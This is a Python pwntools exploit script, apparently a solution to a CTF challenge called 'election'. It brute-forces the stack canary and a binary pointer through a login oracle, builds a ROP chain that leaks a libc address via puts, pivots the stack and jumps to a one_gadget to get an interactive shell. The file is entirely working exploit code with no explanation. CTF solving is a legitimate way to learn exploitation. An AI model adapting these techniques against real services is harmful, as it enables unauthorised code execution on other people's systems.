#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

#r = remote('edu-ctf.csie.org',10180)
r = process('./election')
#libc = ELF('./libc.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def cmd(x):
    r.recvuntil('>')
    r.sendline(str(x))

def login(s):
    cmd(1)
    r.recvuntil('Token: ')
    r.send(s)

def reg(s):
    cmd(2)
    r.recvuntil('token: ')
    r.send(s)

def vote(i):
    cmd(1)
    r.recvuntil(':')
    r.send(str(i))

def say(i,s):
    cmd(2)
    r.recvuntil(':')
    r.sendline(str(i))
    r.recvuntil('Message:')
    r.send(s)

def logout():
    cmd(3)


canary = '\x00'
leak = 'a'*0xb8
reg(leak)
for i in range(7):
    for c in range(0x100):
		login(leak + canary + chr(c))
		if 'Invalid' not in r.recvline():
			canary += chr(c)
			logout()
			break

ll = ''
for i in range(8):
	for c in range(0x100):
		login(leak + canary + ll + chr(c))
		if 'Invalid' not in r.recvline():
			ll += chr(c)
			logout()
			break
        

leak_binary = u64(ll.ljust(8,'\x00')) - 0x1140
buf = leak_binary + 0x202160
leave_ret = leak_binary + 0xbe9 
pop_rdi = leak_binary + 0x11a3
libc_start_main_got = leak_binary + 0x201fe0
puts_plt = leak_binary + 0x940
read_plt = leak_binary + 0x980 
pop_rsi_r15 = leak_binary + 0x11a1
atoi_plt = leak_binary + 0x9c0
pop_rbp = leak_binary + 0xa40

print '[*] leak binary : ',hex(leak_binary)
canary = u64(canary)
print '[*] canary : ',hex(canary)

# 240 + canary + retaddr
for i in range(255):
	reg('a')
	login('a')
	vote(0)
	logout()


#p = 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaab'
print hex(buf)
payload = flat(
	'a'*8 , pop_rdi , libc_start_main_got , puts_plt ,
	#pop_rdi , buf , atoi_plt , # rax=0 for read_syscall
	pop_rdi , 0 , pop_rsi_r15 , buf + 0x700 , 0 , read_plt ,
	pop_rbp , buf + 0x700 - 8 , leave_ret
)

reg(payload)
login(payload)
say(0,'a'*232 + p64(canary) + p64(buf) + p64(leave_ret)) #256

r.recv()
logout()
r.recvuntil('>\n')

libc_start_main = u64(r.recvline()[:-1].ljust(8,'\x00'))
libc_base = libc_start_main - libc.symbols['__libc_start_main']
print '[*] libc_base : ',hex(libc_base)

one_gadget = libc_base + 0x4f322
r.send(p64(one_gadget))

r.interactive()
